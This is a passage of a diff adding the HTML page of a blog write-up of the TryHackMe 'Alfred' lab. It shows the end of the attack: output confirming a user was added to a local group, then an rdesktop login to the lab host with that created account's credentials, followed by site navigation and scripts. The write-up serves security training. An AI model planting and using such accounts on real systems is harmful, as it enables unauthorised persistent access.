+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Successfully added user to local <span class="token function">group</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>As port 3389 was open we can login through rdesktop:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rdesktop <span class="token parameter variable">-g</span> <span class="token number">90</span>% <span class="token parameter variable">-u</span> writeup <span class="token parameter variable">-p</span> I_hope_you_like_it <span class="token number">10.10</span>.151.159<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fqo-un_gDflKbfH01hHIKGIqk4RA.png"></p>
+<h2 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h2><p>get the flag1 and flag2</p>
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Alfred"><span class="toc-number">1.</span> <span class="toc-text">Alfred</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">2.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">3.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">3.1.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Delivery"><span class="toc-number">3.2.</span> <span class="toc-text">Delivery</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SeDebugPrivileg"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">SeDebugPrivileg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SeCreateGlobalPrivilege"><span class="toc-number">3.2.0.3.</span> <span class="toc-text">SeCreateGlobalPrivilege</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Control-and-Command"><span class="toc-number">3.4.</span> <span class="toc-text">Control and Command</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#-1"><span class="toc-number">3.4.0.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Use-metasploit-to-listen-on-the-port"><span class="toc-number">3.4.0.2.</span> <span class="toc-text">Use metasploit to listen on the port</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-2"><span class="toc-number">3.4.0.3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Smb-server-transfer-exe-file"><span class="toc-number">3.4.0.4.</span> <span class="toc-text">Smb server transfer exe file</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post"><span class="toc-number">3.5.</span> <span class="toc-text">Post</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[4].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&text=THM Alfred"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&title=THM Alfred"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&is_video=false&description=THM Alfred"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=THM Alfred&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[4].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&title=THM Alfred"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&title=THM Alfred"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&title=THM Alfred"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&title=THM Alfred"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[4].html&name=THM Alfred&description=&lt;h1 id=&#34;Alfred&#34;&gt;&lt;a href=&#34;#Alfred&#34; class=&#34;headerlink&#34; title=&#34;Alfred&#34;&gt;&lt;/a&gt;Alfred&lt;/h1&gt;&lt;p&gt;Difficulty: Easy&lt;br&gt;Score: 3&amp;#x2F;10&lt;/p&gt;
+&lt;hr&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[4].html&t=THM Alfred"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
